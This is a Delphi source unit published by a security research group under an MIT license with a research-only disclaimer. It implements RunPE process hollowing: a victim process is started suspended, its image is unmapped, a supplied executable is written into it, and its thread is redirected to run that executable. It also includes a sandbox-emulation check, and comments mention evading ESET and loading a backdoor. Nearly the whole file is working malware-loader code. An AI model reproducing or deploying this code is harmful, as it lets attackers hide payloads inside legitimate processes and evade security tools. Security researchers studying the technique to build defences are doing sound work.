
  {
 ===========================================
 MIT License

Copyright (c) 2021 0xsp security research and development

  Unit : RunPE from Memory (Proccess Forking)
  Author : 0xsp.com @zux0x3a



  the author of this module is not responsible for any misuse of this code or similair copied code, the source code and compiled binaries
  are published for the security researching only.
  the technique has been presented in online conference before the release and well-detailed paper has been posted online to help open-source community to build
  enhanced security solutions.

 ===============================================================

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.




 }
unit runner;
{$mode Delphi}

interface

uses Windows;

type
  TByteArray = array of Byte;

  function VirtualAllocEx(hProcess: THandle; lpAddress: Pointer;
    dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer;stdcall;external kernel32 name 'VirtualAllocEx';

   function isEmulated :boolean;

{$IFDEF win64 }
function Fork_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;
{$ENDIF }


{$IFDEF win32 }
function Fork_x86(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;
{$ENDIF }

function NtUnmapViewOfSection(ProcessHandle: THandle; BaseAddress: Pointer): DWORD; stdcall; external 'ntdll.dll';

implementation



function isEmulated :boolean;
var
  mem : intptr;
begin
 mem := dword64(VirtualAllocExNuma(GetCurrentProcess(),0,$1000,$3000,$20,0));

 if mem = 0 then
 result := true
 else
  result := false

end;

procedure Move(Destination, Source: Pointer; dLength:DWORD);
begin
  CopyMemory(Destination, Source, dLength);
end;


{$IFDEF CPU32BITS }
  function Fork_x86(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;   //works perfect with x64 bit
 var
   IDH:        TImageDosHeader;
   INH:        TImageNtHeaders;
   ISH:        TImageSectionHeader;
   PI:         TProcessInformation;
   SI:         TStartUpInfo;
   CONT:       TContext;
   ImageBase:  Pointer;
   Ret:        DWORD;
   i:          integer;
   Addr:       DWORD;
   dOffset:    DWORD;
 begin
   Result := FALSE;
   try
     Move(@IDH, @bFile[0], 64); //64
     if IDH.e_magic = IMAGE_DOS_SIGNATURE then
     begin
       Move(@INH, @bFile[IDH._lfanew], 248);     //248
       if INH.Signature = IMAGE_NT_SIGNATURE then
       begin
         FillChar(SI, SizeOf(TStartupInfo),#0);
         FillChar(PI, SizeOf(TProcessInformation),#0);
         SI.cb := SizeOf(TStartupInfo);
         if CreateProcess(nil, PChar(sVictim), nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, SI, PI) then
         begin
           CONT.ContextFlags := CONTEXT_FULL;
           if GetThreadContext(PI.hThread, CONT) then
           begin
             ReadProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 100), @Addr, 2, Ret);   // it was 4 changed now to 2  //ESET Exploit will be 100 - 2
             NtUnmapViewOfSection(PI.hProcess, @Addr);
             ImageBase := VirtualAllocEx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);

             WriteProcessMemory(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);
             dOffset := IDH._lfanew + 248;    //248
             for i := 0 to INH.FileHeader.NumberOfSections - 1 do
             begin
               Move(@ISH, @bFile[dOffset + (i * 40)], 40);     // 40 , 40
               WriteProcessMemory(PI.hProcess, Pointer(Cardinal(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
               VirtualProtectEx(PI.hProcess, Pointer(Cardinal(ImageBase) + ISH.VirtualAddress), ISH.Misc.VirtualSize, PAGE_EXECUTE_READWRITE, @Addr);
             end;
              WriteProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 10), @ImageBase, 8, Ret);
          //   WriteProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 100), @ImageBase, 8, Ret);    //small backdoor less than 76kb will be 8 / 4  or 8 / 8
             // WriteProcessMemory(PI.hProcess, Pointer(CONT.Ebx + 8), @ImageBase, 8, Ret);  //another one
             CONT.Eax := Cardinal(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
             SetThreadContext(PI.hThread, CONT);
             ResumeThread(PI.hThread);
             Result := TRUE;
           end;
         end;
       end;
     end;
   finally // except
  //   CloseHandle(PI.hProcess);
     CloseHandle(PI.hThread);
  threadhandle:=PI.hProcess;
 end;
 end;



{$ELSE }

function Fork_x64(sVictim:string; bFile:TByteArray;var threadhandle:thandle):Boolean;   //works perfect with x64 bit
const
  cBufferSize = 2048;
var
  IDH:        TImageDosHeader;
  INH:        TImageNtHeaders;
  ISH:        TImageSectionHeader;

  PI:         TProcessInformation;
  vSecurityAttributes: TSecurityAttributes;
  SI:         TStartUpInfo;
  CONT,CONT_B:       PContext;
  ImageBase:  pointer;
 // lpimagebase : Dword64;
  Ret:        SIZE_T;
  i:          integer;
  Addr:       DWORD64;
  dOffset:    DWORD;
  rPipe: THandle;
  wPipe: THandle;
  vReadBytes: DWord;
  vBuffer : Pointer;
begin
  Result := FALSE;



  //IDH := @bFile;
 CopyMemory(@IDH,@bfile[0], 64);

    if IDH.e_magic = IMAGE_DOS_SIGNATURE then
    begin
      Move(@INH, @bFile[IDH._lfanew], 264);     //248

      if INH.Signature = IMAGE_NT_SIGNATURE then
      begin
        FillChar(SI, SizeOf(TStartupInfo),#0);
        FillChar(PI, SizeOf(TProcessInformation),#0);
        SI.cb := SizeOf(TStartupInfo);



        if CreateProcess(nil, PChar(sVictim), nil, nil, false, CREATE_SUSPENDED, nil, nil, SI, PI) then

        begin

          CONT := PCONTEXT(VirtualAlloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
          CONT.ContextFlags := CONTEXT_ALL;

          if GetThreadContext(PI.hThread, CONT^) then
          begin
            ReadProcessMemory(PI.hProcess, Pointer(CONT.rdx + $100), @Addr, 2, Ret);


          //  NtUnmapViewOfSection(PI.hProcess, @Addr);
             if Addr = INH.OptionalHeader.ImageBase then
              begin
             if NtUnmapViewOfSection(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase)) = 0 then
             begin
            ImageBase := VirtualAllocEx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
             $3000, PAGE_EXECUTE_READWRITE);
             end
               else
              begin
              ImageBase := VirtualAllocEx(PI.hProcess, nil, INH.OptionalHeader.SizeOfImage, $3000, PAGE_EXECUTE_READWRITE);
             end;
            end
            else
            begin
            ImageBase := VirtualAllocEx(PI.hProcess, Pointer(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage,
            $3000, PAGE_EXECUTE_READWRITE);

              end;

            WriteProcessMemory(PI.hProcess, ImageBase, @bFile[0], INH.OptionalHeader.SizeOfHeaders, Ret);

            dOffset := IDH._lfanew + 264;    //248
            for i := 0 to INH.FileHeader.NumberOfSections - 1 do
            begin
              Move(@ISH, @bFile[dOffset + (i * 40)], 40);     // 40 , 40
              WriteProcessMemory(PI.hProcess, LPVOID(dword64(ImageBase) + ISH.VirtualAddress), @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
              WriteProcessMemory(PI.hProcess, LPVOID(CONT.rdx + $10), @ImageBase, 8, Ret);
            end;


                //setup another contex with different flags
               CONT_B := PCONTEXT(VirtualAlloc(nil, sizeof(CONT), MEM_COMMIT, PAGE_READWRITE));
               CONT_B.ContextFlags := CONTEXT_INTEGER;

                // set thread context
              CONT_B.RCX := dword64(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;



            SetThreadContext(PI.hThread, CONT_B^);
            ResumeThread(PI.hThread);

            Result := TRUE;

          end;
        end;
      end;
    end;
 // finally // except
 ////   CloseHandle(PI.hProcess);
 //   CloseHandle(PI.hThread);
//threadhandle:=PI.hProcess;
//end;
//end;
end;
{$ENDIF }






end.

